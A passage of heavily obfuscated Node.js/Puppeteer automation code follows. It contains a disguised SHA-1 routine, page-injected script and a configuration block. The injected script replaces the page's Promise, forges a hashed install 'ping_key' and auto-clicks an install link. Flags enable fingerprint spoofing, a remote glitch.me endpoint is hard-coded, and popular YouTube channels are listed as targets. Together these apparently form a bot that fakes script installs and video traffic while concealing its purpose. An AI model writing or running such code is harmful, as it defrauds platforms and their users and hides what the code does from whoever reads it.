-0x2 + 0xaa0] |= (-0x3 * -0x887 + 0x46a + 0x1d0f * -0x1 | L >> 0xb90 + -0x1 * 0x1f94 + 0xa0b * 0x2) << y[-0x1 * 0x2456 + -0xe9 * -0x11 + 0x14e0 & N++], P[N >> 0xb03 + -0xd91 * -0x1 + -0x1892] |= (0x435 + 0xe0 + 0x3 * -0x187 | L >> -0x991 + 0xca * -0x1d + 0x207f & -0x3 * -0xa99 + -0x1 * -0x6ff + -0x268b) << y[-0x3 * 0xb15 + -0x2 * -0xe39 + 0x16 * 0x38 & N++], P[N >> 0x2359 * -0x1 + 0x64d + -0xe87 * -0x2] |= (0x576 + 0x21d * 0xd + -0x206f | L >> 0x20ec + 0xdc8 + -0x1 * 0x2eae & 0x209 * -0xd + -0xc2e + -0xe * -0x2c7) << y[-0x5c * 0x35 + -0xaba + -0x131 * -0x19 & N++], P[N >> 0x34 + -0x168c + 0x165a] |= (0x1cd6 + 0xcbe + 0xb * -0x3bc | 0x296 * 0x8 + 0x2 * -0x3fb + -0xc7b & L) << y[0x1f * -0xbc + -0x2c1 + 0x1988 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x481 + 0x1171 + -0x15b2 * 0x1 ? (this[X(0xc, 'Y%mG')] = P[0x793 + 0x161d + -0x1da0], this['start'] = N - (0x69b + -0x14ab + -0xe50 * -0x1), this['hash'](), this['hashed'] = -0x5 * 0x7ad + 0x1 * -0x1b1 + 0x2813) : this['start'] = N;
                }
                return this['bytes'] > 0xab2e673 * -0x15 + -0x1f34de0ab + 0x3d3fac819 && (this['hBytes'] += this['bytes'] / (-0x14 * -0x879d87a + -0x12d0af53c + -0x1 * -0x183860bb4) << -0x468 + -0x2 * 0x3f6 + 0x2 * 0x62a, this['bytes'] = this['bytes'] % (0x437ce612 * -0x4 + 0x11313d93c + 0xfadfbf0c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0xeb * -0x1a + 0x32e * 0x5 + 0x7f9;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0xa98 + 0x7 * -0x56e + 0x1b7a] = this['block'], J[K >> -0x1 * -0x2531 + 0x11e7 + 0x3716 * -0x1] |= x[-0x104 + 0x43f * 0x4 + -0xff5 & K], this['block'] = J[0x7 * 0x6d + 0x5f2 * 0x1 + -0x1 * 0x8dd], K >= -0x5d8 + -0x5b * -0x1b + -0x5 * 0xb5 && (this['hashed'] || this['hash'](), J[-0x43 * -0x8b + -0xe3 * 0x1 + -0x237e] = this['block'], J[0xc1 * -0x1 + 0x199 * -0x2 + 0x403] = J[-0xdfd + -0x86 * 0x1 + -0x2 * -0x742] = J[0x6d * 0x26 + 0x1 * 0x4d6 + -0x1502] = J[-0x378 + 0xa25 + 0x6aa * -0x1] = J[0x1 * -0x636 + -0x1 * 0x3c7 + 0xa01] = J[-0x1116 + -0x1f1 * -0x12 + -0x11d7] = J[-0x1d9f + 0x7 * -0x349 + 0x2 * 0x1a52] = J[-0x3 * -0x55b + -0x2529 + -0x1 * -0x151f] = J[-0x1 * -0x1dbf + 0x268c + 0x5 * -0xda7] = J[0xb93 * 0x2 + -0x17ce + 0xb1 * 0x1] = J[0xff4 + 0x21fb + 0xf1 * -0x35] = J[0xa8b * -0x2 + -0x2f6 + 0x1817] = J[-0x943 * -0x1 + -0x1 * -0x1d1b + -0x2652] = J[0x79f + 0x86a + -0xffc] = J[-0x1057 * 0x2 + -0x20f0 + 0x41ac] = J[-0x1 * 0x802 + 0x3 * 0x13b + 0x460] = 0x2197 + -0x195b * 0x1 + -0x83c), J[0xc41 + 0x1 * 0x2047 + -0x163d * 0x2] = this['hBytes'] << -0x17b6 + -0x268 * 0x3 + -0x1ef1 * -0x1 | this['bytes'] >>> 0x2016 + 0x1 * -0x12b3 + 0xd46 * -0x1, J[-0xcd3 * -0x1 + -0x170a + -0xa46 * -0x1] = this['bytes'] << -0xac + -0x2262 + 0x2311, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x3b6 * 0x1 + -0x51 * -0x6b + 0x11 * -0x1c5; J < 0x1 * 0x15fe + 0x19c6 * -0x1 + 0x418 * 0x1; ++J)
                K = Q[J - (0xd * -0x2c4 + 0x1126 * -0x2 + 0x4643)] ^ Q[J - (0x1788 * -0x1 + 0x3fd + -0x1393 * -0x1)] ^ Q[J - (0xcd2 + 0xb9 * 0x12 + 0x2 * -0xce3)] ^ Q[J - (0x1 * 0x42 + 0x261a + -0x264c)], Q[J] = K << -0x1 * 0x2563 + -0xa + 0x2 * 0x12b7 | K >>> -0x6ff * 0x3 + 0xcd2 + 0x2 * 0x425;
              for (J = -0x341 * 0x4 + 0x43 * -0x67 + 0x27f9; J < -0x2 * 0xf9e + 0x14c + -0x1 * -0x1e04; J += 0xe6c + 0x329 * 0x1 + -0x1190)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2593 + -0x86c + 0x2e04 | L >>> -0x1 * -0x45f + 0xd91 + -0x11d5) + (M & N | ~M & O) + P + (-0xf1 * 0x88551e + -0x9d7299b2 + 0x1784d3489) + Q[J] << 0x2f * 0x79 + 0x9ef * 0x1 + -0x1013 * 0x2) << 0x1949 + -0x22d * -0x1 + -0x1b71 | P >>> 0x2 * 0xab5 + 0x4f4 + 0x51 * -0x53) + (L & (M = M << -0x7cb + 0x21e + 0x5cb | M >>> 0xdf * 0xb + 0x53 + -0x9e6) | ~L & N) + O + (-0x96dd59ff + 0x7c78c0af + 0x74e712e9) + Q[J + (-0x26fc + 0x183 * 0x7 + 0x1c68)] << 0x1dc1 + -0x1010 * -0x2 + -0x3de1 * 0x1) << -0x1b9c + 0x1 * -0x2549 + 0xe * 0x4a3 | O >>> 0x1098 + -0xd07 + -0x376) + (P & (L = L << 0xa8 + 0x2 * -0x1145 + 0x2200 | L >>> 0x1 * 0x47f + 0x1616 + -0x1a93) | ~P & M) + N + (-0x8c896 * 0xd81 + -0xe7 * 0x963e73 + 0x1cb975bf * 0xc) + Q[J + (-0x1279 * -0x2 + 0x20a9 + -0x4599)] << 0x950 + -0x20d9 * -0x1 + -0x2a29) << -0x603 + -0x6 * -0x650 + -0x1fd8 | N >>> -0x1e18 + 0x2 * -0x838 + -0x1 * -0x2ea3) + (O & (P = P << -0x515 * 0x6 + 0x2a1 + 0x1bfb | P >>> 0xa6a + -0x2108 + 0x16a0) | ~O & L) + M + (0x1bb40ebd * -0x3 + -0x6c21e00f + 0x119c085df * 0x1) + Q[J + (-0x187b + 0x1dc5 * -0x1 + 0x3643 * 0x1)] << -0xd6 * 0x5 + -0x2a8 * -0x2 + -0x122) << 0x1552 * -0x1 + 0xf76 + -0xd7 * -0x7 | M >>> -0xddc + -0x1976 * 0x1 + 0x276d) + (N & (O = O << 0x3da * 0x5 + 0xf29 + -0x1 * 0x224d | O >>> 0x31c * 0xb + 0x260b + -0x483d) | ~N & P) + L + (0x7ff6894b * -0x1 + 0x1f5f6bee + 0xbb1996f6) + Q[J + (0xe * 0x1a9 + 0x1 * 0x5ab + -0x1ce5)] << 0x11d6 + 0x3 * -0x224 + -0xb6a, N = N << -0x1d67 + 0x1 * -0xec + 0x1e71 | N >>> 0x2 * -0x452 + 0x24aa + -0x1c04;
              for (; J < 0x1da2 + -0x2ef * 0xb + -0x1 * -0x2cb; J += 0x3c7 * 0xa + 0x1d7b * -0x1 + -0x846)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xe9a + 0xf28 * 0x2 + -0x2ce5 | L >>> 0x4d7 + -0x863 + -0x37 * -0x11) + (M ^ N ^ O) + P + (0x76ef291a + 0xac9 * 0x123ebd + -0xccdbe1de) + Q[J] << 0x179e * -0x1 + -0x7d * 0x2 + -0x4 * -0x626) << 0x446 + -0x25bd + -0x10be * -0x2 | P >>> -0x2 * -0x22 + -0x2445 + 0x4 * 0x907) + (L ^ (M = M << 0x18ec + -0x3 * 0x6f1 + -0x3fb | M >>> -0x21d4 + 0x1fe9 + 0x1ed) ^ N) + O + (0x1b6 * -0x2b38b9 + 0x18af135a + 0xa01de4cd) + Q[J + (-0x83e + -0x805 + -0x1044 * -0x1)] << 0x2 * 0xec0 + 0x91d + -0x269d) << 0x1a38 + -0x264d + 0xc1a | O >>> 0x1 * -0xb1f + 0x1 * 0x2c2 + -0x1 * -0x878) + (P ^ (L = L << 0x543 + -0x6b6 + -0x1 * -0x191 | L >>> 0x1 * 0x1cc7 + 0x5a * -0x48 + -0x375) ^ M) + N + (0x1138c0de + 0x51044085 * 0x2 + 0xb557 * -0x6091) + Q[J + (0x89 * -0x20 + 0x12 * 0x3d + 0x19b * 0x8)] << 0xbd7 + -0x25 * 0x5f + -0x4 * -0x79) << 0xc65 + 0x1fab + 0x29 * -0x113 | N >>> 0x20 * -0x6d + 0xcad + -0x5 * -0x36) + (O ^ (P = P << -0x663 + 0x2 * 0xc8c + -0x1 * 0x1297 | P >>> 0x1 * -0x463 + 0x825 * -0x3 + 0x1cd4) ^ L) + M + (-0x9b81515b + -0x45 * 0x1f058b3 + 0x19023253b) + Q[J + (0x544 + 0x184 + -0x1 * 0x6c5)] << -0x8fd + 0x3b5 + 0x1 * 0x548) << 0x12cc + 0x370 * -0x1 + -0xf57 | M >>> 0xb9b * 0x2 + 0x1343 * 0x1 + -0x152f * 0x2) + (N ^ (O = O << -0x1fcd * 0x1 + 0x1a7d + 0x56e | O >>> 0x9 * -0x200 + -0x4 * 0x2bf + -0x3 * -0x9aa) ^ P) + L + (-0x557d780 + -0x4377cc5d + -0xb7a98f7e * -0x1) + Q[J + (-0xb11 + -0x10a6 * 0x2 + 0x2c61)] << -0xad5 + -0x9a5 + 0x147a, N = N << 0xd70 + 0x1e80 + 0x2 * -0x15e9 | N >>> 0x43f + 0x94 * -0x1 + -0x3a9;
              for (; J < -0x2554 + 0x7e7 + 0x1da9; J += -0x6 * -0x2dd + -0x54e * -0x1 + 0x1 * -0x1677)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x6 * -0x473 + 0x1440 + -0x2eed | L >>> 0xb * 0xd8 + -0x23e4 + 0x7 * 0x3d1) + (M & N | M & O | N & O) + P - (0x3e988582 + 0x2 * 0x1ef1b79f + -0x3 * 0x3dd3b34) + Q[J] << -0x5 * -0x445 + 0x1010 + 0x9d * -0x3d) << -0x1f7 + 0x20e * -0x4 + -0x1 * -0xa34 | P >>> -0x69 * 0x54 + 0x3f * -0x3b + 0x3114) + (L & (M = M << -0x2468 + 0x1e8a + 0x1 * 0x5fc | M >>> 0x188f * -0x1 + 0x2 * -0x1129 + 0x4b * 0xc9) | L & N | M & N) + O - (0x3a754db * -0x2f + -0x129bf1a9 + -0x12f38c902 * -0x1) + Q[J + (0x1 * 0x2634 + -0x2df + 0x4 * -0x8d5)] << -0x1a26 * 0x1 + -0x229d + 0x3cc3) << -0x1830 + -0x1717 + 0x2f4c | O >>> -0xbf * -0x18 + -0x2392 + -0x11c5 * -0x1) + (P & (L = L << -0x599 * 0x6 + 0x1 * -0x11b0 + 0x3364 | L >>> 0x39b + 0x15 * -0x26 + -0x7b) | P & M | L & M) + N - (0x5da62 * 0x2473 + -0x96b0cb * 0xe9 + 0x24b449e1) + Q[J + (-0x1d86 * -0x1 + -0x5 * 0x61f + -0x9 * -0x1f)] << 0xfde + 0xc11 + -0x1bef) << 0xf42 + 0x10b * 0x3 + -0x125e | N >>> 0x14dd * -0x1 + -0xe * 0x12b + 0x232 * 0x11) + (O & (P = P << 0x15 * 0x5f + -0x230b + 0x1b5e | P >>> -0x8cb + -0xbf4 + 0x14c1) | O & L | P & L) + M - (0xc7ccbfa5 + -0x52c87591 + -0x10 * 0x42006f) + Q[J + (0x8fb + -0x1ad3 + 0x7 * 0x28d)] << -0x2 * -0xf1c + -0x6 * 0x425 + -0x5 * 0x112) << 0x209 + 0x157a * 0x1 + 0x1 * -0x177e | M >>> -0x5cf * -0x3 + -0x4 * -0x642 + -0x4e * 0x8b) + (N & (O = O << -0xcf1 + -0x21b1 + 0x2ec0 | O >>> -0x7 * -0x17f + 0xed * -0x1 + -0x98a) | N & P | O & P) + L - (0xddc19a1e + -0x83efc37 * -0x1a + -0x10 * 0x14342f49) + Q[J + (-0x2d * -0xb5 + -0x15bb + -0xa12 * 0x1)] << -0x2107 + -0x330 + 0x2437, N = N << 0x11 * 0xf0 + 0x1a9a + -0x2a6c | N >>> -0x803 + 0x5 * -0x416 + 0x1c73;
              for (; J < 0x3 * 0x521 + 0x13a0 + -0x22b3; J += 0x1b25 + 0x495 + -0x1fb5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x108e + 0x890 + 0x5 * -0x505 | L >>> 0x2 * 0x884 + -0x187 + -0xf66) + (M ^ N ^ O) + P - (-0x591488e6 + -0x15e83b54 + -0x1653 * -0x75f8c) + Q[J] << -0x2036 + -0x5c1 + 0x25f7) << -0x11be + -0x1bae + 0x2d71 | P >>> -0xe27 * 0x1 + -0xc33 * 0x1 + 0x1a75) + (L ^ (M = M << -0x13d6 + 0x14a + 0x12aa | M >>> -0x2197 * -0x1 + 0x81b + -0x29b0) ^ N) + O - (0x1597c5bd * 0x4 + -0x18a145 * 0x331 + 0x3cacd * 0xc17) + Q[J + (-0x1 * 0x219 + -0x1c94 + -0x1 * -0x1eae)] << 0x77b * -0x1 + 0x5 * 0x161 + 0x96) << 0xd37 + 0x1ea5 + 0x81 * -0x57 | O >>> 0x1de0 + 0x376 + -0x213b) + (P ^ (L = L << 0x2661 + -0x286 + 0x7 * -0x51b | L >>> -0x158 + 0x157f + -0x1425) ^ M) + N - (-0x3b9085d3 + -0x119 * 0x3af579 + 0xb1e535ce) + Q[J + (-0x1 * 0x1f6 + 0x1624 + 0x50b * -0x4)] << 0x7a * 0x1d + -0xc1 * -0x31 + -0x32c3) << 0x71d + -0x6 * -0x35c + -0x1b40 | N >>> -0x2700 + 0x1 * -0x995 + -0x1858 * -0x2) + (O ^ (P = P << -0x1843 * -0x1 + 0x1ec4 + -0x36e9 * 0x1 | P >>> 0x416 + 0x1a84 + 0x58 * -0x59) ^ L) + M - (0x13f5456e + -0x7924 * 0xc15e + 0x7d2897f4) + Q[J + (0x6 * 0x606 + -0x2b * -0xa1 + -0x26e * 0x1a)] << -0x311 * -0x1 + 0x1721 * -0x1 + 0x282 * 0x8) << -0x999 * -0x3 + 0x1 * -0x769 + -0x155d | M >>> -0x1 * -0x1849 + 0x95 * -0x19 + -0x91 * 0x11) + (N ^ (O = O << 0x3f4 * 0x4 + -0x2e3 * -0x1 + -0x47 * 0x43 | O >>> -0x16a2 + -0x1 * -0xfd9 + -0x2f * -0x25) ^ P) + L - (-0x5b4d2c2a + 0x8ccda8c + -0xd2268 * -0xa5d) + Q[J + (-0x11 * -0xbe + 0x2437 + -0x30d1)] << -0x1edd * 0x1 + 0xf04 + 0xfd9, N = N << 0x11b * 0x1d + -0x1d * 0xa7 + -0xd06 | N >>> -0x6d * 0x59 + -0x95 * -0x3b + 0x6 * 0x98;
              this['h0'] = this['h0'] + L << -0x2 * -0x781 + -0x1 * 0x2225 + 0x1323, this['h1'] = this['h1'] + M << -0x6fa * 0x2 + -0x2134 + 0x2f28, this['h2'] = this['h2'] + N << 0x1087 + -0x4 * -0x7cd + 0x2fbb * -0x1, this['h3'] = this['h3'] + O << 0x55e * -0x2 + -0xa38 + 0x14f4, this['h4'] = this['h4'] + P << 0x62b + -0x1ed7 + 0x18ac;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x22b6 + -0x14c9 + -0xd * -0x447 & 0x70 * 0x4b + 0xc11 + -0x2cd2 * 0x1] + w[J >> -0x27 * -0xa + -0x239e + -0x8 * -0x446 & 0xb * -0x1e7 + 0x395 * 0x4 + 0x6a8] + w[J >> -0x330 + 0x514 + -0x1d0 & -0x16a3 + 0x51b * -0x6 + 0x2 * 0x1aaa] + w[J >> 0x1237 + -0x1 * 0x1bd9 + -0x2 * -0x4d9 & 0x2 * 0x74e + -0x176e + -0x1 * -0x8e1] + w[J >> 0x12aa + 0xd7f * 0x1 + -0x201d & 0x21e7 + 0x26 * 0xc0 + -0x3e58] + w[J >> 0x6a3 + -0x2562 + -0x1 * -0x1ec7 & 0xf00 + 0xd3e + -0x1c2f] + w[J >> -0x8db * -0x1 + 0x1b10 + 0x1 * -0x23e7 & 0x6c5 * -0x5 + -0x1cf1 * -0x1 + -0x1 * -0x4f7] + w[0x1621 + 0x1155 + -0x2767 & J] + w[K >> 0x147 * -0x1 + 0x181c + -0x16b9 & 0x2b * 0x5 + -0x2640 + 0x2578] + w[K >> 0x3 * -0x87c + 0x288 + 0x1704 * 0x1 & -0xa * -0x183 + -0x5 * 0x18d + -0x74e] + w[K >> -0x65 * 0x9 + -0xeb6 + 0x1257 & 0xefc + -0x1c23 + 0xd36] + w[K >> 0x2 * 0x757 + 0x356 + -0x11f4 & 0x107c + 0x3 * -0x7e1 + -0x47 * -0x1a] + w[K >> 0xe9 * -0x25 + -0xc7b + 0x2e34 & 0x50e + 0x73e * 0x3 + -0x1 * 0x1ab9] + w[K >> -0xb6b + 0x1a * -0x167 + -0x995 * -0x5 & 0x1cfe + -0x2025 + 0x336 * 0x1] + w[K >> 0x36f * 0x7 + 0x29 * 0x64 + 0x115 * -0x25 & -0x220f + 0x3 * -0xc6e + -0x392 * -0x14] + w[-0x6b * -0x2c + -0x1 * -0x190d + -0x2b62 & K] + w[L >> 0xb * 0xfa + 0x1b6 * 0x10 + -0x2602 & -0x3 * 0x906 + 0x1b * 0x162 + -0xd * 0xc9] + w[L >> -0x25f2 * -0x1 + 0x132d * -0x1 + 0x1 * -0x12ad & -0x1 * -0x72d + -0x1 * 0x22f + -0x4ef] + w[L >> 0x12a5 + -0x268e + 0x77 * 0x2b & 0x3 * 0xa05 + 0xb * -0x27d + -0x2a1 * 0x1] + w[L >> -0x9 * -0x407 + -0x14e6 + 0xf49 * -0x1 & -0x1e85 * 0x1 + -0x25ca + 0x445e] + w[L >> -0x1 * 0xc07 + -0x423 + -0x33e * -0x5 & 0x1f * -0xc2 + 0x1 * 0x1f0f + 0x3c1 * -0x2] + w[L >> 0xa7f + 0x3 * 0x70 + 0x1 * -0xbc7 & 0x5e3 + 0x1f0d + 0x419 * -0x9] + w[L >> -0x6d3 * -0x4 + -0xac7 + -0x1081 & 0x109c * 0x1 + 0x6a5 * -0x3 + -0x362 * -0x1] + w[0x1836 + -0xda6 + -0xa81 & L] + w[M >> -0x25fa * 0x1 + -0x5e * 0x2f + 0x4d * 0xb8 & 0x108 * -0x3 + -0xa43 + 0xd6a] + w[M >> -0x1054 + 0xf * -0x194 + 0x503 * 0x8 & 0x1 * 0x2362 + -0xd * 0xce + -0x13 * 0x14f] + w[M >> -0x13c * -0x1d + -0xe53 + -0x1565 * 0x1 & -0x1aa0 + 0x603 + 0x17a * 0xe] + w[M >> 0xb9b * 0x3 + -0x1c5 + 0x20fc * -0x1 & 0x18aa + 0x1 * 0x1ebf + 0x1 * -0x375a] + w[M >> -0x2678 + -0x131 * -0x16 + 0x3f * 0x32 & -0x16 * -0x94 + 0x2683 + -0x332c] + w[M >> 0x15bd + -0x1 * 0xd8b + -0x2 * 0x415 & 0x361 + -0x2062 + 0x1d10] + w[M >> 0x3 * -0xaf7 + 0x5d5 * -0x5 + 0x3e12 & -0x2 * -0x48b + 0xe86 * 0x1 + -0x1 * 0x178d] + w[-0x17e4 * 0x1 + 0x1 * -0x1d76 + -0x1 * -0x3569 & M] + w[N >> -0x146e + 0x2bc + -0x56 * -0x35 & 0x2 * 0x1111 + 0x1347 + -0x1 * 0x355a] + w[N >> -0x4f9 * 0x3 + 0x20da * 0x1 + -0x11d7 * 0x1 & -0x6 * -0x3b + 0x1 * 0x196a + -0x1abd] + w[N >> 0x2 * 0xdc6 + -0xaa0 + -0x62 * 0x2c & -0x59 * 0xa + 0x1dab + -0x1e * 0xdf] + w[N >> -0x5 * -0x2 + -0x1 * 0x10c9 + -0xd * -0x14b & -0x20fb + -0x173a + -0x2 * -0x1c22] + w[N >> 0x1 * 0x12f1 + -0x3ca + 0x3 * -0x509 & 0x14f7 + -0xf9d + 0x10f * -0x5] + w[N >> -0x231 + 0x5 * -0x89 + 0x4e6 & 0x353 + -0x255c + 0x2 * 0x110c] + w[N >> 0x12a1 + -0x9f1 + -0x2e4 * 0x3 & -0x1 * 0x2072 + -0x1bff + 0x3c80] + w[0x41e + -0x1459 + 0x2b7 * 0x6 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x18aa + 0x30 + 0x1892 & -0x1acd + 0xcfa + 0xed2 * 0x1,
                J >> -0x77f * 0x3 + 0x1cf7 + -0x1 * 0x66a & -0x3 * -0x5cb + -0x1953 * -0x1 + 0x29b5 * -0x1,
                J >> 0xa7b * 0x3 + 0x1b4d + 0x5 * -0xbbe & -0x8be + -0x33f + 0xcfc,
                0xf8 + 0x1ac * -0x4 + 0x9 * 0xbf & J,
                K >> 0xe * 0x62 + -0x13ec + -0x8 * -0x1d5 & -0x18b * 0xb + -0x2564 + 0x375c,
                K >> -0x1566 + 0x1e3 + 0x1393 * 0x1 & 0xe1d * 0x1 + 0x5 * -0x37b + -0x449 * -0x1,
                K >> 0x23b1 * -0x1 + -0x162a + -0x1 * -0x39e3 & 0x4cf * 0x2 + 0x12e3 + 0x1 * -0x1b82,
                -0x207d + -0x96a + 0x1 * 0x2ae6 & K,
                L >> -0x3ac + -0x14a4 + 0x1868 & -0x98b + -0x251 * 0x5 + 0x7 * 0x329,
                L >> 0x3 * -0xaf1 + 0x2f * -0x44 + -0x1 * -0x2d5f & -0x17d5 * 0x1 + -0x2 * -0xbb7 + -0x1 * -0x166,
                L >> -0x1e7f + -0x945 + 0x27cc & 0x1 * 0x1c7f + 0x7f * -0x29 + -0x729,
                0x1ea5 + -0xef * 0x29 + 0x8a1 & L,
                M >> -0xffd * 0x1 + 0xfc5 + 0x5 * 0x10 & -0x281 + 0xa1e + 0x16 * -0x4d,
                M >> -0x213d + -0x1a * -0x16c + -0x139 * 0x3 & 0xc91 + 0x14 * -0x15d + 0xfb2,
                M >> 0x1b2 * 0x7 + 0x3 * -0xce1 + 0x8ef * 0x3 & 0x4b7 + -0x1 * 0x1967 + 0xd * 0x1ab,
                -0x19a4 + 0xea + -0xf * -0x1b7 & M,
                N >> 0x2 * -0xfd2 + -0x1bc0 + 0x3b7c & -0x3 * -0x61 + -0x1662 + -0x1a * -0xdb,
                N >> 0x21f2 + 0xe37 + -0x3019 & 0x259 * 0x10 + 0x16d7 * -0x1 + -0xdba,
                N >> 0xa * 0x196 + -0x1df * -0x9 + -0x20ab & -0xf36 + -0x5e + 0x1 * 0x1093,
                0x8c2 + -0x1 * -0xc97 + -0x145a & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1 * 0x24e6 + 0x9 * 0x100 + -0x2dd2), (K = new DataView(J))['setUint32'](0xa06 + -0x95e + -0xa8, this['h0']), K['setUint32'](-0x11b5 + 0x25a + 0xf5f, this['h1']), K['setUint32'](-0x582 + -0x1f67 + 0x24f1, this['h2']), K['setUint32'](-0x22f2 + -0x2 * 0xcc + 0x29d * 0xe, this['h3']), K['setUint32'](-0x140f + 0x397 + 0x1088, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x7b0 + -0x4a7 + -0x309 * 0x1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1 * 0x1231 + -0x2 * -0x1080 + -0x3331;
            J[-0x9 * -0x35e + -0x6e7 + -0x3 * 0x7cd]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1867 + 0x1352 + -0x2bb9] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x13bb + 0x164a + -0x28e), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x3 * 0x1c1 + -0x350 + -0x1f2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x25b9 + -0xf06 + -0x1 * -0x3a9b), Promise['resolve'](0x6b4 + -0xf81 + 0x8ce);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x82a * 0x4 + 0x2118 + -0x41c0; j < 0x163a * -0x1 + -0x9 * -0x3e1 + -0xcae; j++)
    i();
}
const NETWORK_PATIENCE = -0x5 * 0x515 + 0x39d0 + -0x127 + (-0x3 * 0x75d + -0x1bff + 0x3dce) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1c4d + 0x1e49 + -0x1f9) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x1460 + 0x5ca + -0x1a2a);
    let h = e[f];
    return h;
  }, d(b, c);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require(Y(0x16)),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x97 * -0xd + -0x199 + 0x944; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
